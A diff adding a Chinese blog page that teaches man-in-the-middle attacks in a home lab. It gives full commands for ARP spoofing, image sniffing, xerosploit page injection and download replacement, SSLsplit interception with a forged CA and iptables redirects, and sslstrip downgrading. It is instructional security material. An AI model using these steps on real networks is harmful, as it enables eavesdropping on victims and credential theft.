@@ -1,0 +1,1394 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>中间人攻击学习 - 明月归的小站</title>
+  
+    <meta name="keywords" content="折腾,中间人攻击">
+  
+
+  
+    <meta name="description" content="本篇博客主要介绍中间人攻击的相关内容！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="/static/js-css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="/static/js-css/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">中间人攻击学习</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/">
+      中间人攻击学习
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年3月25日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：2.6k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：10分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/" class="leancloud_visitors" data-flag-title="中间人攻击学习">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客主要介绍中间人攻击的相关内容！</p>
+<a id="more"></a>
+
+<p><strong>本文仅作技术交流，请勿做违法乱纪的事！</strong></p>
+<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>中间人攻击（Man-in-the-MiddleAttack，简称“MITM攻击”）是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。这样的话，两台通信计算机之间的流量都会经过被控计算机，通过信息篡改，信息窃取等方式对正常的通信造成威胁。</p>
+<p>随着计算机通信网技术的不断发展，MITM攻击也越来越多样化。最初，攻击者只要将网卡设为混杂模式，伪装成代理服务器监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等。后来，随着交换机代替集线器，简单的嗅探攻击已经不能成功，必须先进行ARP欺骗才行。如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer 安全套接层)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的。</p>
+<h2 id="arp地址欺骗"><a href="#arp地址欺骗" class="headerlink" title="arp地址欺骗"></a>arp地址欺骗</h2><p>在同一局域网内的主机通信依靠arp地址而不是ip地址，当两台主机通信时(A 和 B)，主机A 向主机B发送一个arp广播（内有主机B的IP地址），局域网内的所有主机都会收到这个arp包，然后与在自己的ip地址进行比较，如果符合就回复给主机 A 一个带有自己的arp地址的arp包，同时将主机 A 的arp地址记录下来。接着使用这个MAC地址发送数据（由网卡附加MAC地址）。因此，本地高速缓存的这个ARP表是本地网络流通的基础，而且这个缓存是动态的，主机的每次通信都需要从新发送arp广播包得到主机 B 的arp地址（动态性）。</p>
+<p>如果这时有一台主机C想要获取两台主机的通信过程时，主机C 可以主动向主机A 发送 arp应答包 主机A接收到这个应答包后更新自己的arp缓存表 当然还是B的ip但mac地址已经改变 ，这时主机C再正常连接主机B，这样就可以监听双方的通信过程并且不被发现 ，这是一种最典型的arp欺骗。</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325231032.png" style="zoom:50%;">
+
+<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><h3 id="arp-scan"><a href="#arp-scan" class="headerlink" title="arp-scan"></a>arp-scan</h3><p>arp-scan是Kali Linux自带的一款ARP扫描工具。该工具可以进行单一目标扫描，也可以进行批量扫描。批量扫描的时候，用户可以通过CIDR、地址范围或者列表文件的方式指定。该工具允许用户定制ARP包，构建非标准数据包。同时，该工具会自动解析Mac地址，给出MAC对应的硬件厂商，帮助用户确认目标。</p>
+<p><strong>查看同一局域网存活的主机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan --interface=wlan0 --localnet</span><br></pre></td></tr></table></figure>
+
+<h3 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h3><p>arpspoof是一个好用的ARP欺骗工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-i 指定网卡</li>
+<li>-c 指定还原arp配置时使用的硬件地址</li>
+<li>-t 指定arp欺骗的目标</li>
+<li>host一般为网关</li>
+<li>-r 欺骗两个主机（网关和目标）以捕获双向通信</li>
+</ul>
+<p><strong>欺骗网关和目标：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.1.105 -r 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="driftnet"><a href="#driftnet" class="headerlink" title="driftnet"></a>driftnet</h3><p>driftnet是一款简单而使用的图片捕获工具，可以很方便的在网络数据包中抓取图片。该工具可以实时和离线捕获指定数据包中是图片，kali里默认有。</p>
+<p><strong>主要参数：</strong></p>
+<ul>
+<li><p>-b  捕获到新的图片时发出嘟嘟声</p>
+</li>
+<li><p>-i interface   选择监听接口</p>
+</li>
+<li><p>-f file  读取一个指定pcap数据包中的图片</p>
+</li>
+<li><p>-p 不让所监听的接口使用混杂模式</p>
+</li>
+<li><p>-a 后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）</p>
+</li>
+<li><p>-m number 指定保存图片数的数目</p>
+</li>
+<li><p>-d directory 指定保存图片的路径</p>
+</li>
+<li><p>-x prefix 指定保存图片的前缀名</p>
+</li>
+</ul>
+<p><strong>后台监听网卡保存图片并提示：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i wlan0 -b -a -d /root/Desktop/pic</span><br></pre></td></tr></table></figure>
+
+<h3 id="xerosploit"><a href="#xerosploit" class="headerlink" title="xerosploit"></a>xerosploit</h3><p>github地址：<a target="_blank" rel="noopener" href="https://github.com/LionSec/xerosploit">https://github.com/LionSec/xerosploit</a></p>
+<p>Xerosploit是一款可以进行中间人攻击的渗透测试工具包。它具有多种模块，可以进行多重有效的攻击，如拒绝服务和端口扫描、劫持等。由bettercap和nmap强力驱动。</p>
+<p>可惜的是，这款工具已经很长时间不维护了，但功能依旧很强大</p>
+<p>工具安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/LionSec/xerosploit</span><br><span class="line"><span class="built_in">cd</span> xerosploit &amp;&amp; sudo python install.py</span><br><span class="line">sudo xerosploit</span><br></pre></td></tr></table></figure>
+
+<p>安装中可能会会缺少依赖包，直接pip安装就行</p>
+<p>有这么多模块，直接使用就行，非常方便：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pscan：端口扫描</span><br><span class="line">dos：对目标进行dos攻击</span><br><span class="line">ping：对目标进行ping是否存活</span><br><span class="line">injecthtml：将html注入到目标访问的网站中</span><br><span class="line">injectjs：将javascript注入到目标访问的网站中</span><br><span class="line">rdownload：替换目标下载的文件</span><br><span class="line">sniff：嗅探目标的流量信息</span><br><span class="line">dspoof：将所有http流量重定向到特定ip</span><br><span class="line">yplay：在目标的浏览器中后台播放youtube视频（还得fq）</span><br><span class="line">replace：替换目标访问网站的所有图片</span><br><span class="line">driftnet：查看目标访问网站的所有图片</span><br><span class="line">move：让目标访问网站变得抖动</span><br><span class="line">deface：将目标访问网站的所有页面替换成自己定义的html代码</span><br></pre></td></tr></table></figure>
+
+<h2 id="抓取局域网里的图片"><a href="#抓取局域网里的图片" class="headerlink" title="抓取局域网里的图片"></a>抓取局域网里的图片</h2><p>kali：192.168.0.112</p>
+<p>靶机：192.168.0.103</p>
+<p>没进行arp欺骗之前，我们看下arp表</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325214515.png" style="zoom:80%;">
+
+<p>让后设置ip转发,默认为0</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+
+<p>如果不设置为1，进行下面的操作相当于断网攻击</p>
+<p>然后我们进行欺骗</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1</span><br></pre></td></tr></table></figure>
+
+<p>此时我们再看下arp表，发现mac地址已经发生改变成kali的mac地址</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325214839.png" style="zoom:80%;">
+
+<p>可以看到这里已经抓到图片，感谢大佬的博客做实验，逃……</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325215406.png" style="zoom:80%;">
+
+<p>发现并不是很全，https的都没抓到</p>
+<p>我们用wireshark查看一下流量，设置一下源地址，就能看到截获的流量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src==192.168.0.103</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325220555.png" style="zoom:80%;">
+
+<h2 id="xerosploit一些操作"><a href="#xerosploit一些操作" class="headerlink" title="xerosploit一些操作"></a>xerosploit一些操作</h2><p>安装结束后直接运行xerosploit</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325221354.png" style="zoom:80%;">
+
+<p>输入help获取帮助，直接scan命令扫描，有时候侯可能扫描不到，直接输ip就行</p>
+<p>进入modules之后，help查看所有模块，先试试<strong>注入html</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;font-size:80px;&quot;</span> &gt;</span>hacked by MoonBack!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>随便找了个不是https的站点，可以看到已经注入成功</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325223100.png" style="zoom:80%;">
+
+<p><strong>替换所有图片</strong>，随便找的一个站点，没什莫特别的意思</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325223835.png" style="zoom: 67%;">
+
+<p><strong>替换下载文件</strong></p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325224113.png" style="zoom:80%;">
+
+<p>我们试着下载一个exe</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325224431.png" style="zoom:80%;">
+
+<p>和kali里生成的后门一样</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325224545.png" style="zoom:80%;">
+
+<h2 id="伪造证书抓https"><a href="#伪造证书抓https" class="headerlink" title="伪造证书抓https"></a>伪造证书抓https</h2><p>首先，我们需要一份数字根证书，可以用openssl生成</p>
+<p>先生成证书私钥文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out ca.key 2048</span><br></pre></td></tr></table></figure>
+
+<p>然后用私钥签名生成证书：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325232838.png" style="zoom:80%;">
+
+<p>再介绍一下工具<strong>SSLsplit</strong></p>
+<ul>
+<li>透明SSL/TLS中间人攻击工具</li>
+<li>对客户端伪装成服务器，对服务器伪装成客户端</li>
+<li>伪装服务器需要伪装证书</li>
+<li>支持SSL/TLS加密的SMTP POP3 FTP等通信中间人攻击</li>
+</ul>
+<p><strong>参数：</strong></p>
+<ul>
+<li><p>-k 指定私钥key文件，进行欺骗</p>
+</li>
+<li><p>-c 指定Root CA证书文件</p>
+</li>
+<li><p>-D Debug模式，用于输出SSLSplit状态，建议使用时加上</p>
+</li>
+<li><p>-j 指定log目录地址</p>
+</li>
+<li><p>-S 指定-j参数目录下需要记录截断GET、POST请求的子目录地址</p>
+</li>
+<li><p>-l 指定存储的连接信息文件</p>
+</li>
+<li><p>ssl IP 端口 指定ssl需要监听的端口</p>
+</li>
+<li><p>tcp IP 端口 指定tcp需要监听的端口</p>
+</li>
+</ul>
+<p>打开ip_forward功能</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+
+<p>进行端口转发，即将本机443等端口转发到SSLsplit监听的端口，这里是8080和8443</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</span><br></pre></td></tr></table></figure>
+
+<p>查看一下设置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325233821.png" style="zoom:80%;">
+
+<p>开启arp欺骗</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1</span><br></pre></td></tr></table></figure>
+
+<p>SSLsplit监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslsplit -D -l connect.log -j /root/Desktop/d -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br></pre></td></tr></table></figure>
+
+<p>此时打开百度，发现有这种提醒，如果忽略危害直接打开，我们的账号等信息就会被窃取</p>
+<p>当然，如果通过特殊途径把证书装到了受害者的设备上，就不会有提醒，所有的信息也会被解密</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325234941.png" style="zoom:80%;">
+
+<p>这种效果不太好，很卡，而且图片显示不出来，也不知道为啥</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200326001603.png" style="zoom:80%;">
+
+<p>随便输一个账号，看到里面有信息</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200326001511.png" style="zoom:80%;">
+
+<p>虽然效果不算理想，但也不失为一种方式，大佬的解释感觉很好</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200326001857.png" style="zoom:80%;">
+
+<h2 id="https-降级攻击"><a href="#https-降级攻击" class="headerlink" title="https 降级攻击"></a>https 降级攻击</h2><p>攻击者拦截用户流量后，欺骗用户与攻击者进行 http 通信，攻击者与服务器保持正常通信 （http 或 https），从而获取用户信息。</p>
+<p>SSLstrip工具主要利用了上面的原理</p>
+<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/moxie0/sslstrip">https://github.com/moxie0/sslstrip</a></p>
+<p>用iptables把80端口的流量转发到sslstrip监听的8080端口上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080</span><br></pre></td></tr></table></figure>
+
+<p>然后SSlstrip监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -l 8080</span><br></pre></td></tr></table></figure>
+
+<p>开启arp欺骗</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1</span><br></pre></td></tr></table></figure>
+
+<p>ip转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+
+<p>通常情况下我们访问百度的时侯都会强制转换成https，但现在我们访问都是http了，https的无法打开，所以说这个也有一定的局限性，以后看看还有其他方法没</p>
+<img src="/2020/03/25/%E7%9F%A5%E8%AF%86%E7%82%B9/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200326004214.png" style="zoom:80%;">
+
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42025840/article/details/81604497">https://blog.csdn.net/qq_42025840/article/details/81604497</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/118574.html">https://www.freebuf.com/sectool/118574.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ysynhtt/article/details/39996933">https://blog.csdn.net/ysynhtt/article/details/39996933</a></p>
